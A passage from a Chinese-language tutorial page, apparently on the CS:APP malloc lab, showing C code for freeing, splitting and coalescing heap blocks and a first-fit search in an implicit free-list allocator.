</span><span id=__span-157-21><a id=__codelineno-157-21 name=__codelineno-157-21></a><span class=w>    </span><span class=cm>/* 判断相邻块是否是空闲块, 进行合并 */</span>
</span><span id=__span-157-22><a id=__codelineno-157-22 name=__codelineno-157-22></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>coalesce</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-157-23><a id=__codelineno-157-23 name=__codelineno-157-23></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>扩展堆每次在原始堆的尾部申请空间，mem_sbrk函数返回指向旧堆尾部的指针，因此，可以直接将原始堆的尾部位置设置新空闲块的头部。接下来就是 free，设置一下头部和脚部即可，free 完后注意合并空闲块：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-158-1> 1</a></span>
<span class=normal><a href=#__codelineno-158-2> 2</a></span>
<span class=normal><a href=#__codelineno-158-3> 3</a></span>
<span class=normal><a href=#__codelineno-158-4> 4</a></span>
<span class=normal><a href=#__codelineno-158-5> 5</a></span>
<span class=normal><a href=#__codelineno-158-6> 6</a></span>
<span class=normal><a href=#__codelineno-158-7> 7</a></span>
<span class=normal><a href=#__codelineno-158-8> 8</a></span>
<span class=normal><a href=#__codelineno-158-9> 9</a></span>
<span class=normal><a href=#__codelineno-158-10>10</a></span>
<span class=normal><a href=#__codelineno-158-11>11</a></span>
<span class=normal><a href=#__codelineno-158-12>12</a></span>
<span class=normal><a href=#__codelineno-158-13>13</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-158-1><a id=__codelineno-158-1 name=__codelineno-158-1></a><span class=cm>/*</span>
</span><span id=__span-158-2><a id=__codelineno-158-2 name=__codelineno-158-2></a><span class=cm>* mm_free - Freeing a block does nothing.</span>
</span><span id=__span-158-3><a id=__codelineno-158-3 name=__codelineno-158-3></a><span class=cm>*/</span>
</span><span id=__span-158-4><a id=__codelineno-158-4 name=__codelineno-158-4></a><span class=kt>void</span><span class=w> </span><span class=nf>mm_free</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>ptr</span><span class=p>)</span>
</span><span id=__span-158-5><a id=__codelineno-158-5 name=__codelineno-158-5></a><span class=p>{</span>
</span><span id=__span-158-6><a id=__codelineno-158-6 name=__codelineno-158-6></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ptr</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-158-7><a id=__codelineno-158-7 name=__codelineno-158-7></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-158-8><a id=__codelineno-158-8 name=__codelineno-158-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>ptr</span><span class=p>));</span>
</span><span id=__span-158-9><a id=__codelineno-158-9 name=__codelineno-158-9></a>
</span><span id=__span-158-10><a id=__codelineno-158-10 name=__codelineno-158-10></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>ptr</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-158-11><a id=__codelineno-158-11 name=__codelineno-158-11></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>ptr</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-158-12><a id=__codelineno-158-12 name=__codelineno-158-12></a><span class=w>    </span><span class=n>coalesce</span><span class=p>(</span><span class=n>ptr</span><span class=p>);</span><span class=w> </span><span class=c1>// 合并空闲块</span>
</span><span id=__span-158-13><a id=__codelineno-158-13 name=__codelineno-158-13></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>分割空闲块要考虑剩下的空间是否足够放置头部和脚部：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-159-1> 1</a></span>
<span class=normal><a href=#__codelineno-159-2> 2</a></span>
<span class=normal><a href=#__codelineno-159-3> 3</a></span>
<span class=normal><a href=#__codelineno-159-4> 4</a></span>
<span class=normal><a href=#__codelineno-159-5> 5</a></span>
<span class=normal><a href=#__codelineno-159-6> 6</a></span>
<span class=normal><a href=#__codelineno-159-7> 7</a></span>
<span class=normal><a href=#__codelineno-159-8> 8</a></span>
<span class=normal><a href=#__codelineno-159-9> 9</a></span>
<span class=normal><a href=#__codelineno-159-10>10</a></span>
<span class=normal><a href=#__codelineno-159-11>11</a></span>
<span class=normal><a href=#__codelineno-159-12>12</a></span>
<span class=normal><a href=#__codelineno-159-13>13</a></span>
<span class=normal><a href=#__codelineno-159-14>14</a></span>
<span class=normal><a href=#__codelineno-159-15>15</a></span>
<span class=normal><a href=#__codelineno-159-16>16</a></span>
<span class=normal><a href=#__codelineno-159-17>17</a></span>
<span class=normal><a href=#__codelineno-159-18>18</a></span>
<span class=normal><a href=#__codelineno-159-19>19</a></span>
<span class=normal><a href=#__codelineno-159-20>20</a></span>
<span class=normal><a href=#__codelineno-159-21>21</a></span>
<span class=normal><a href=#__codelineno-159-22>22</a></span>
<span class=normal><a href=#__codelineno-159-23>23</a></span>
<span class=normal><a href=#__codelineno-159-24>24</a></span>
<span class=normal><a href=#__codelineno-159-25>25</a></span>
<span class=normal><a href=#__codelineno-159-26>26</a></span>
<span class=normal><a href=#__codelineno-159-27>27</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-159-1><a id=__codelineno-159-1 name=__codelineno-159-1></a><span class=cm>/*</span>
</span><span id=__span-159-2><a id=__codelineno-159-2 name=__codelineno-159-2></a><span class=cm>* 分离空闲块</span>
</span><span id=__span-159-3><a id=__codelineno-159-3 name=__codelineno-159-3></a><span class=cm>* @ bp: 空闲块的有效载荷指针</span>
</span><span id=__span-159-4><a id=__codelineno-159-4 name=__codelineno-159-4></a><span class=cm>* @ asize: 请求分配的对齐后的内存大小</span>
</span><span id=__span-159-5><a id=__codelineno-159-5 name=__codelineno-159-5></a><span class=cm>*/</span>
</span><span id=__span-159-6><a id=__codelineno-159-6 name=__codelineno-159-6></a><span class=kt>void</span><span class=w> </span><span class=nf>place</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>,</span><span class=w> </span><span class=kt>size_t</span><span class=w> </span><span class=n>asize</span><span class=p>)</span>
</span><span id=__span-159-7><a id=__codelineno-159-7 name=__codelineno-159-7></a><span class=p>{</span>
</span><span id=__span-159-8><a id=__codelineno-159-8 name=__codelineno-159-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>csize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-159-9><a id=__codelineno-159-9 name=__codelineno-159-9></a>
</span><span id=__span-159-10><a id=__codelineno-159-10 name=__codelineno-159-10></a><span class=w>    </span><span class=cm>/* 判断是否能够分离空闲块 */</span>
</span><span id=__span-159-11><a id=__codelineno-159-11 name=__codelineno-159-11></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>csize</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>asize</span><span class=p>)</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>DSIZE</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-159-12><a id=__codelineno-159-12 name=__codelineno-159-12></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-159-13><a id=__codelineno-159-13 name=__codelineno-159-13></a><span class=w>        </span><span class=c1>// 2 * DSIZE是最小空闲块大小要求，保证剩余空间可以形成一个有效的空闲块</span>
</span><span id=__span-159-14><a id=__codelineno-159-14 name=__codelineno-159-14></a><span class=w>        </span><span class=c1>// 有效空闲块至少需要：头部(4字节) + 有效载荷(至少4字节) + 脚部(4字节) = 12字节，但为了对齐要求，设置为16字节</span>
</span><span id=__span-159-15><a id=__codelineno-159-15 name=__codelineno-159-15></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-159-16><a id=__codelineno-159-16 name=__codelineno-159-16></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-159-17><a id=__codelineno-159-17 name=__codelineno-159-17></a><span class=w>        </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-159-18><a id=__codelineno-159-18 name=__codelineno-159-18></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-159-19><a id=__codelineno-159-19 name=__codelineno-159-19></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-159-20><a id=__codelineno-159-20 name=__codelineno-159-20></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-159-21><a id=__codelineno-159-21 name=__codelineno-159-21></a><span class=w>    </span><span class=cm>/* 设置为填充：这部分剩余空间被称为内部碎片 */</span>
</span><span id=__span-159-22><a id=__codelineno-159-22 name=__codelineno-159-22></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-159-23><a id=__codelineno-159-23 name=__codelineno-159-23></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-159-24><a id=__codelineno-159-24 name=__codelineno-159-24></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-159-25><a id=__codelineno-159-25 name=__codelineno-159-25></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-159-26><a id=__codelineno-159-26 name=__codelineno-159-26></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-159-27><a id=__codelineno-159-27 name=__codelineno-159-27></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>合并要分四种情况进行处理：</p> <p><img alt="alt text" src=../../img/image-110.png></p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-160-1> 1</a></span>
<span class=normal><a href=#__codelineno-160-2> 2</a></span>
<span class=normal><a href=#__codelineno-160-3> 3</a></span>
<span class=normal><a href=#__codelineno-160-4> 4</a></span>
<span class=normal><a href=#__codelineno-160-5> 5</a></span>
<span class=normal><a href=#__codelineno-160-6> 6</a></span>
<span class=normal><a href=#__codelineno-160-7> 7</a></span>
<span class=normal><a href=#__codelineno-160-8> 8</a></span>
<span class=normal><a href=#__codelineno-160-9> 9</a></span>
<span class=normal><a href=#__codelineno-160-10>10</a></span>
<span class=normal><a href=#__codelineno-160-11>11</a></span>
<span class=normal><a href=#__codelineno-160-12>12</a></span>
<span class=normal><a href=#__codelineno-160-13>13</a></span>
<span class=normal><a href=#__codelineno-160-14>14</a></span>
<span class=normal><a href=#__codelineno-160-15>15</a></span>
<span class=normal><a href=#__codelineno-160-16>16</a></span>
<span class=normal><a href=#__codelineno-160-17>17</a></span>
<span class=normal><a href=#__codelineno-160-18>18</a></span>
<span class=normal><a href=#__codelineno-160-19>19</a></span>
<span class=normal><a href=#__codelineno-160-20>20</a></span>
<span class=normal><a href=#__codelineno-160-21>21</a></span>
<span class=normal><a href=#__codelineno-160-22>22</a></span>
<span class=normal><a href=#__codelineno-160-23>23</a></span>
<span class=normal><a href=#__codelineno-160-24>24</a></span>
<span class=normal><a href=#__codelineno-160-25>25</a></span>
<span class=normal><a href=#__codelineno-160-26>26</a></span>
<span class=normal><a href=#__codelineno-160-27>27</a></span>
<span class=normal><a href=#__codelineno-160-28>28</a></span>
<span class=normal><a href=#__codelineno-160-29>29</a></span>
<span class=normal><a href=#__codelineno-160-30>30</a></span>
<span class=normal><a href=#__codelineno-160-31>31</a></span>
<span class=normal><a href=#__codelineno-160-32>32</a></span>
<span class=normal><a href=#__codelineno-160-33>33</a></span>
<span class=normal><a href=#__codelineno-160-34>34</a></span>
<span class=normal><a href=#__codelineno-160-35>35</a></span>
<span class=normal><a href=#__codelineno-160-36>36</a></span>
<span class=normal><a href=#__codelineno-160-37>37</a></span>
<span class=normal><a href=#__codelineno-160-38>38</a></span>
<span class=normal><a href=#__codelineno-160-39>39</a></span>
<span class=normal><a href=#__codelineno-160-40>40</a></span>
<span class=normal><a href=#__codelineno-160-41>41</a></span>
<span class=normal><a href=#__codelineno-160-42>42</a></span>
<span class=normal><a href=#__codelineno-160-43>43</a></span>
<span class=normal><a href=#__codelineno-160-44>44</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-160-1><a id=__codelineno-160-1 name=__codelineno-160-1></a><span class=cm>/*</span>
</span><span id=__span-160-2><a id=__codelineno-160-2 name=__codelineno-160-2></a><span class=cm>* 合并空闲块</span>
</span><span id=__span-160-3><a id=__codelineno-160-3 name=__codelineno-160-3></a><span class=cm>* @ bp: 指向刚被释放或新创建的空闲块的有效载荷指针</span>
</span><span id=__span-160-4><a id=__codelineno-160-4 name=__codelineno-160-4></a><span class=cm>* @ return: 指向合并后空闲块的有效载荷指针</span>
</span><span id=__span-160-5><a id=__codelineno-160-5 name=__codelineno-160-5></a><span class=cm>*/</span>
</span><span id=__span-160-6><a id=__codelineno-160-6 name=__codelineno-160-6></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>coalesce</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>)</span>
</span><span id=__span-160-7><a id=__codelineno-160-7 name=__codelineno-160-7></a><span class=p>{</span>
</span><span id=__span-160-8><a id=__codelineno-160-8 name=__codelineno-160-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>prev_alloc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_ALLOC</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>     </span><span class=cm>/* 前一块是否被分配 */</span>
</span><span id=__span-160-9><a id=__codelineno-160-9 name=__codelineno-160-9></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>next_alloc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_ALLOC</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>     </span><span class=cm>/* 后一块是否被分配 */</span>
</span><span id=__span-160-10><a id=__codelineno-160-10 name=__codelineno-160-10></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span><span class=w>                       </span><span class=cm>/* 当前块大小 */</span>
</span><span id=__span-160-11><a id=__codelineno-160-11 name=__codelineno-160-11></a>
</span><span id=__span-160-12><a id=__codelineno-160-12 name=__codelineno-160-12></a><span class=w>    </span><span class=cm>/*</span>
</span><span id=__span-160-13><a id=__codelineno-160-13 name=__codelineno-160-13></a><span class=cm>    * 四种情况：前后都不空, 前不空后空, 前空后不空, 前后都空</span>
</span><span id=__span-160-14><a id=__codelineno-160-14 name=__codelineno-160-14></a><span class=cm>    */</span>
</span><span id=__span-160-15><a id=__codelineno-160-15 name=__codelineno-160-15></a><span class=w>    </span><span class=cm>/* 前后都不空 */</span>
</span><span id=__span-160-16><a id=__codelineno-160-16 name=__codelineno-160-16></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>prev_alloc</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>next_alloc</span><span class=p>)</span>
</span><span id=__span-160-17><a id=__codelineno-160-17 name=__codelineno-160-17></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-160-18><a id=__codelineno-160-18 name=__codelineno-160-18></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-160-19><a id=__codelineno-160-19 name=__codelineno-160-19></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-160-20><a id=__codelineno-160-20 name=__codelineno-160-20></a><span class=w>    </span><span class=cm>/* 前不空后空 */</span>
</span><span id=__span-160-21><a id=__codelineno-160-21 name=__codelineno-160-21></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>prev_alloc</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>next_alloc</span><span class=p>)</span>
</span><span id=__span-160-22><a id=__codelineno-160-22 name=__codelineno-160-22></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-160-23><a id=__codelineno-160-23 name=__codelineno-160-23></a><span class=w>        </span><span class=n>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>  </span><span class=c1>// 增加当前块大小</span>
</span><span id=__span-160-24><a id=__codelineno-160-24 name=__codelineno-160-24></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=c1>// 先修改头</span>
</span><span id=__span-160-25><a id=__codelineno-160-25 name=__codelineno-160-25></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=c1>// 根据头部中的大小来定位尾部</span>
</span><span id=__span-160-26><a id=__codelineno-160-26 name=__codelineno-160-26></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-160-27><a id=__codelineno-160-27 name=__codelineno-160-27></a><span class=w>    </span><span class=cm>/* 前空后不空 */</span>
</span><span id=__span-160-28><a id=__codelineno-160-28 name=__codelineno-160-28></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>prev_alloc</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>next_alloc</span><span class=p>)</span>
</span><span id=__span-160-29><a id=__codelineno-160-29 name=__codelineno-160-29></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-160-30><a id=__codelineno-160-30 name=__codelineno-160-30></a><span class=w>        </span><span class=n>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>  </span><span class=c1>// 增加当前块大小</span>
</span><span id=__span-160-31><a id=__codelineno-160-31 name=__codelineno-160-31></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-160-32><a id=__codelineno-160-32 name=__codelineno-160-32></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-160-33><a id=__codelineno-160-33 name=__codelineno-160-33></a><span class=w>        </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span><span class=w>                     </span><span class=c1>// 注意指针要变</span>
</span><span id=__span-160-34><a id=__codelineno-160-34 name=__codelineno-160-34></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-160-35><a id=__codelineno-160-35 name=__codelineno-160-35></a><span class=w>    </span><span class=cm>/* 都空 */</span>
</span><span id=__span-160-36><a id=__codelineno-160-36 name=__codelineno-160-36></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-160-37><a id=__codelineno-160-37 name=__codelineno-160-37></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-160-38><a id=__codelineno-160-38 name=__codelineno-160-38></a><span class=w>        </span><span class=n>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)))</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>  </span><span class=c1>// 增加当前块大小</span>
</span><span id=__span-160-39><a id=__codelineno-160-39 name=__codelineno-160-39></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-160-40><a id=__codelineno-160-40 name=__codelineno-160-40></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-160-41><a id=__codelineno-160-41 name=__codelineno-160-41></a><span class=w>        </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-160-42><a id=__codelineno-160-42 name=__codelineno-160-42></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-160-43><a id=__codelineno-160-43 name=__codelineno-160-43></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-160-44><a id=__codelineno-160-44 name=__codelineno-160-44></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h4 id=_18>放置策略<a class=headerlink href=#_18 title="Permanent link">¶</a></h4> <p>首次适配：从堆的头部开始遍历，找到第一个大小足够的空闲块。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-161-1> 1</a></span>
<span class=normal><a href=#__codelineno-161-2> 2</a></span>
<span class=normal><a href=#__codelineno-161-3> 3</a></span>
<span class=normal><a href=#__codelineno-161-4> 4</a></span>
<span class=normal><a href=#__codelineno-161-5> 5</a></span>
<span class=normal><a href=#__codelineno-161-6> 6</a></span>
<span class=normal><a href=#__codelineno-161-7> 7</a></span>
<span class=normal><a href=#__codelineno-161-8> 8</a></span>
<span class=normal><a href=#__codelineno-161-9> 9</a></span>
<span class=normal><a href=#__codelineno-161-10>10</a></span>
<span class=normal><a href=#__codelineno-161-11>11</a></span>
<span class=normal><a href=#__codelineno-161-12>12</a></span>
<span class=normal><a href=#__codelineno-161-13>13</a></span>
<span class=normal><a href=#__codelineno-161-14>14</a></span>
<span class=normal><a href=#__codelineno-161-15>15</a></span>
<span class=normal><a href=#__codelineno-161-16>16</a></span>
<span class=normal><a href=#__codelineno-161-17>17</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-161-1><a id=__codelineno-161-1 name=__codelineno-161-1></a><span class=cm>/*</span>
</span><span id=__span-161-2><a id=__codelineno-161-2 name=__codelineno-161-2></a><span class=cm>* 首次适配</span>
</span><span id=__span-161-3><a id=__codelineno-161-3 name=__codelineno-161-3></a><span class=cm>* @ asize: 请求分配的对齐后的内存大小</span>
</span><span id=__span-161-4><a id=__codelineno-161-4 name=__codelineno-161-4></a><span class=cm>* @ return: 指向分配块的有效载荷指针</span>
</span><span id=__span-161-5><a id=__codelineno-161-5 name=__codelineno-161-5></a><span class=cm>*/</span>
</span><span id=__span-161-6><a id=__codelineno-161-6 name=__codelineno-161-6></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>first_fit</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>asize</span><span class=p>)</span>
</span><span id=__span-161-7><a id=__codelineno-161-7 name=__codelineno-161-7></a><span class=p>{</span>
</span><span id=__span-161-8><a id=__codelineno-161-8 name=__codelineno-161-8></a><span class=w>    </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-161-9><a id=__codelineno-161-9 name=__codelineno-161-9></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>heap_list</span><span class=p>;</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>))</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>))</span>
</span><span id=__span-161-10><a id=__codelineno-161-10 name=__codelineno-161-10></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-161-11><a id=__codelineno-161-11 name=__codelineno-161-11></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>))</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>asize</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>GET_ALLOC</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>))))</span>
</span><span id=__span-161-12><a id=__codelineno-161-12 name=__codelineno-161-12></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-161-13><a id=__codelineno-161-13 name=__codelineno-161-13></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-161-14><a id=__codelineno-161-14 name=__codelineno-161-14></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-161-15><a id=__codelineno-161-15 name=__codelineno-161-15></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-161-16><a id=__codelineno-161-16 name=__codelineno-161-16></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
</span><span id=__span-161-17><a id=__codelineno-161-17 name=__codelineno-161-17></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>最佳适配：从堆的头部开始遍历，找到第一个大小足够的空闲块，且大小最小。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-162-1> 1</a></span>
